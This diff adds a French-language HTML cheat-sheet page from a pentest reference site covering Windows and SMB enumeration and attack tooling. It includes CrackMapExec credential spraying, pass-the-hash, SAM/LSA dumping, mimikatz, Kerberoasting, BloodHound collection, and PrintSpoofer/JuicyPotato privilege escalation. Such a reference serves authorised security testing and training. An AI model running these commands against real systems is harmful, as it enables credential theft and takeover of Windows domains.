@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows & SMB Enum — PenTest Hub</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-brand"><a href="../index.html" style="color:inherit;"><span class="bracket">[</span>PenTest Hub<span class="bracket">]</span></a></div>
+  <div class="navbar-nav">
+    <a href="../index.html">Dashboard</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="sqlmap.html">SQLMap</a>
+    <a href="john.html">John</a>
+    <a href="google-dorks.html">Dorks</a>
+    <a href="osint.html">OSINT</a>
+    <a href="netcat.html">Netcat</a>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <a href="../index.html" class="back-btn">← Retour au Hub</a>
+
+  <div class="tool-page-header">
+    <div class="tool-page-icon">🪟</div>
+    <div>
+      <div class="tool-page-title">Windows & SMB Enum</div>
+      <div class="tool-page-subtitle">Enum4linux, SMBclient, CrackMapExec, BloodHound — Active Directory & Windows</div>
+      <div class="tool-page-meta">
+        <span class="badge badge-orange">Windows</span>
+        <span class="badge badge-blue">SMB</span>
+        <span class="badge badge-purple">Active Directory</span>
+      </div>
+    </div>
+  </div>
+
+  <h2 class="section-h">🔍 Enum4linux</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Enum4linux — Énumération Samba/Windows</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Installation</span>
+sudo apt install enum4linux
+
+<span class="cmd-comment"># Scan complet</span>
+enum4linux <span class="cmd-flag">-a</span> <span class="cmd-value">192.168.1.1</span>
+
+<span class="cmd-comment"># Énumération ciblée</span>
+enum4linux <span class="cmd-flag">-U</span> <span class="cmd-value">192.168.1.1</span>   <span class="cmd-comment"># Utilisateurs</span>
+enum4linux <span class="cmd-flag">-S</span> <span class="cmd-value">192.168.1.1</span>   <span class="cmd-comment"># Partages (shares)</span>
+enum4linux <span class="cmd-flag">-G</span> <span class="cmd-value">192.168.1.1</span>   <span class="cmd-comment"># Groupes</span>
+enum4linux <span class="cmd-flag">-P</span> <span class="cmd-value">192.168.1.1</span>   <span class="cmd-comment"># Politique mots de passe</span>
+enum4linux <span class="cmd-flag">-o</span> <span class="cmd-value">192.168.1.1</span>   <span class="cmd-comment"># Info OS</span>
+enum4linux <span class="cmd-flag">-r</span> <span class="cmd-value">192.168.1.1</span>   <span class="cmd-comment"># RID brute force (users)</span>
+
+<span class="cmd-comment"># Avec credentials</span>
+enum4linux <span class="cmd-flag">-u admin -p password -a</span> <span class="cmd-value">192.168.1.1</span>
+
+<span class="cmd-comment"># Enum4linux-ng (version moderne)</span>
+enum4linux-ng <span class="cmd-flag">-A</span> <span class="cmd-value">192.168.1.1</span>
+enum4linux-ng <span class="cmd-flag">-As</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password</span></code></pre>
+  </div>
+
+  <h2 class="section-h">📁 SMBclient & SMBmap</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">SMB — Partages et accès</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Lister les partages (null session)</span>
+smbclient <span class="cmd-flag">-L</span> \\\\<span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-N</span>
+smbclient <span class="cmd-flag">-L</span> //<span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-N</span>   <span class="cmd-comment"># Syntaxe alternative</span>
+
+<span class="cmd-comment"># Connexion à un partage</span>
+smbclient \\\\<span class="cmd-value">192.168.1.1</span>\\<span class="cmd-value">SHARE</span> <span class="cmd-flag">-U admin</span>
+smbclient \\\\<span class="cmd-value">192.168.1.1</span>\\<span class="cmd-value">SHARE</span> <span class="cmd-flag">-N</span>   <span class="cmd-comment"># Null session</span>
+
+<span class="cmd-comment"># Commandes dans smbclient</span>
+smb> ls              <span class="cmd-comment"># Lister les fichiers</span>
+smb> cd dossier      <span class="cmd-comment"># Naviguer</span>
+smb> get fichier.txt <span class="cmd-comment"># Télécharger</span>
+smb> put local.txt   <span class="cmd-comment"># Uploader</span>
+smb> exit
+
+<span class="cmd-comment"># SMBmap — cartographier les accès</span>
+smbmap <span class="cmd-flag">-H</span> <span class="cmd-value">192.168.1.1</span>                          <span class="cmd-comment"># Null session</span>
+smbmap <span class="cmd-flag">-H</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password</span>    <span class="cmd-comment"># Authentifié</span>
+smbmap <span class="cmd-flag">-H</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password -r SHARE</span>   <span class="cmd-comment"># Lister récursivement</span>
+smbmap <span class="cmd-flag">-H</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">--download SHARE/secret.txt</span>      <span class="cmd-comment"># Télécharger</span></code></pre>
+  </div>
+
+  <h2 class="section-h">⚡ CrackMapExec (CME / NetExec)</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">CrackMapExec</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Installation</span>
+sudo apt install crackmapexec
+pip3 install netexec   <span class="cmd-comment"># Successeur moderne (nxc)</span>
+
+<span class="cmd-comment"># Énumération SMB</span>
+crackmapexec smb <span class="cmd-value">192.168.1.0/24</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password</span>
+
+<span class="cmd-comment"># Tester des credentials sur un réseau</span>
+crackmapexec smb <span class="cmd-value">192.168.1.0/24</span> <span class="cmd-flag">-u admin -p password</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u users.txt -p passwords.txt</span>
+
+<span class="cmd-comment"># Pass-the-Hash</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -H</span> <span class="cmd-value">NTLM_HASH</span>
+
+<span class="cmd-comment"># Exécuter des commandes</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password -x</span> <span class="cmd-string">"whoami"</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password -X</span> <span class="cmd-string">"Get-Process"</span>  <span class="cmd-comment"># PowerShell</span>
+
+<span class="cmd-comment"># Dump SAM / LSA</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password --sam</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password --lsa</span>
+
+<span class="cmd-comment"># Partages</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password --shares</span>
+
+<span class="cmd-comment"># Modules</span>
+crackmapexec smb <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password -M mimikatz</span>
+
+<span class="cmd-comment"># Kerberoasting via CME</span>
+crackmapexec ldap <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-u admin -p password --kerberoasting output.txt</span></code></pre>
+  </div>
+
+  <h2 class="section-h">🩸 BloodHound — Active Directory</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">BloodHound / SharpHound</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Installation BloodHound</span>
+sudo apt install bloodhound neo4j
+
+<span class="cmd-comment"># Démarrer Neo4j</span>
+sudo neo4j start
+<span class="cmd-comment"># Naviguer vers http://localhost:7474 → changer le mot de passe par défaut</span>
+
+<span class="cmd-comment"># Collecter les données avec BloodHound Python (depuis Linux)</span>
+pip3 install bloodhound
+bloodhound-python <span class="cmd-flag">-u admin -p password -d domain.local -dc</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-flag">-c all</span>
+
+<span class="cmd-comment"># SharpHound (depuis Windows cible — PowerShell)</span>
+<span class="cmd-comment"># Télécharger SharpHound.ps1 puis :</span>
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\
+
+<span class="cmd-comment"># Importer les fichiers JSON dans BloodHound</span>
+<span class="cmd-comment"># Glisser-déposer les fichiers .json dans l'interface BloodHound</span>
+
+<span class="cmd-comment"># Requêtes BloodHound utiles :</span>
+<span class="cmd-comment"># - "Find all Domain Admins"</span>
+<span class="cmd-comment"># - "Find Shortest Paths to Domain Admins"</span>
+<span class="cmd-comment"># - "Find Principals with DCSync Rights"</span>
+<span class="cmd-comment"># - "Find Kerberoastable Users"</span>
+<span class="cmd-comment"># - "Find AS-REP Roastable Users"</span></code></pre>
+  </div>
+
+  <h2 class="section-h">🪟 Privilege Escalation Windows</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">PrivEsc Windows</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Informations système</span>
+systeminfo
+whoami /all
+net user
+net localgroup administrators
+
+<span class="cmd-comment"># Services vulnérables (permissions mal configurées)</span>
+sc qc NomService
+accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Users" *
+
+<span class="cmd-comment"># WinPEAS (automatisé)</span>
+.\winPEAS.exe > output.txt
+
+<span class="cmd-comment"># PowerSploit</span>
+Import-Module .\PowerSploit.ps1
+Invoke-AllChecks
+
+<span class="cmd-comment"># PrintSpoofer (SeImpersonatePrivilege)</span>
+PrintSpoofer.exe -i -c cmd
+
+<span class="cmd-comment"># Juicy Potato (SeImpersonatePrivilege)</span>
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+
+<span class="cmd-comment"># Vérifier les sauvegardes non chiffrées</span>
+dir /s *pass* *vnc* *cred*
+findstr /si password *.xml *.ini *.txt *.config</code></pre>
+  </div>
+
+</div>
+
+<footer class="footer"><span>[PenTest Hub]</span> — Usage légal uniquement | © Steveny</footer>
+<div id="toast" class="toast"></div>
+<script src="../js/main.js"></script>
+</body>
+</html>
